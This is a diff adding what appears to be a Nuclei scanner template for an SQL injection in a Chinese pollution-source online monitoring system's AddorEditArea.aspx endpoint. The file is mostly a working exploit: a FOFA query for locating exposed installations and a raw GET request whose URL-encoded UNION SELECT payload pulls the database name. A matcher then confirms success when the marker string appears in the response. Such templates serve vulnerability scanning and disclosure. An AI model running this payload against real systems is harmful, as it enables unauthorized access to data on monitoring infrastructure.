@@ -1,0 +1,24 @@
+id: wanweiyingchuang-monitor-sql-injection
+
+info:
+  name: 万维盈创污染源在线监控系统AddorEditArea.aspx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="ImgGwry/download.png" || (body="images/errorpage.gif" && body="错误页面")
+      该系统AddorEditArea.aspx接口存在潜在SQL注入安全缺陷，攻击者可通过构造恶意请求参数实现数据库敏感信息获取。
+  tags: 万维盈创
+
+http:
+- raw:
+  - |
+    GET /Admin/Area/AddorEditArea.aspx?AreaIndex=TABI20180725105800033%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28113%29%2BISNULL%28CAST%28DB_NAME%28%29%20AS%20VARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL--%20IGCf HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'qxkvq'
